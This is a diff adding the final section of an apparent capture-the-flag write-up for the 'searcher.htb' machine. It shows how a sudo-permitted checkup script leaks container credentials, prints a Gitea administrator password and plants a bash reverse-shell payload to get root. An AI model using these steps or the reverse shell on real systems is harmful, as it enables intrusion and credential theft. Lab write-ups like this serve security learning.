@@ -153,12 +153,96 @@ oops, we actually can't view the content of the script, we don't have enough pri
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4792fec9-4b81-464f-a030-095693e05864)
 
+As you can see from the above screenshot that args are needed to run this script. 
+
+If we try to do a full-checkup we get this
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/080ffadd-99d9-4351-86bb-b5492208ccf7)
+
+Lets test the other args
+
+command:```sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps```
+command:```sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/85a404b9-4e9f-4bb3-9dbf-4a88d5118601)
+
+You can see fom the above screenshot that the argument ```docker-inspect``` actually stands out.
+
+Reading this [documentation](https://docs.docker.com/engine/reference/commandline/inspect/) I saw that we get a subsection in JSON format.
+
+So, to use ```docker-inspect``` we have to specify the ```container_id```. To get the ```container_id``` we can use the arg ```docker-ps```
+
+command:```sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/baccb61c-71a1-4ed4-8c32-b1e9e6d90d96)
+
+We'll be using those container ids
+
+command:```sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' 960873171e2e```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/df070a85-c234-4de0-b37c-f4ea3560cf47)
+
+cool, we were able to get the creds for a database ```gitea```
+
+Lets dump the content of the other container id
+
+command:```sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' f84a6b33fb5a```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f9fd5399-18b9-4234-a9af-672af1715397)
+
+nice nice, we got creds from this container also
+
+We can login as the administrator user on gitea using those passwords we found in the containers.
+
+First lets add the subdomain ```gitea.searcher.htb``` to our ```/etc/hosts``` file
+
+Navigating to the subdomain
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/22d37186-6402-44fe-bd1e-6b955350fcad)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4529b323-72e0-4648-8ad7-fbf7b061081c)
+
+username:```administrator```        password:```yuiu1hoiu4i5ho1uh```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c4126058-4a94-473b-b020-d919306ec7fb)
+
+nice nice, we are in. 
+
+Lets check the scripts
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/365af08d-92d6-4d77-b5f9-91e395c8abc5)
+
+Checking the content of the script I found this
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8ff51cce-7f5d-465f-b1d5-5983287bac68)
+
+This means to run the action ```full-checkup``` a file ```full-checkup.sh``` is being executed.
+
+We can exploit this by creating a malicious bash script that can help us get a reverse shell back to our machine
+
+payload
+```bash
+#!/bin/bash
+
+bash -i >& /dev/tcp/LHOST/LPORT 0>&1
+```
+Save this in a file ```full-checkup.sh```, then give it executable permission using the command ```chmod +x full-checkup.sh```. 
+
+Ensure you edit the ```LHOST``` and ```LPORT```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/090a6356-13a4-4ae2-940d-bf2cc11df104)
+
+Now, lets run the ```full-checkup``` command again, this time we'll set up our netcat listener for incoming connections
+
+command:```sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7687e796-88eb-4bef-b06d-428ae27512a3)
+
+We spawned a shell as the root user😎
 
 
-
-
-
-
+That will be all for today
+<br><br>
+[Back To Home](../../index.md)
 
 
 
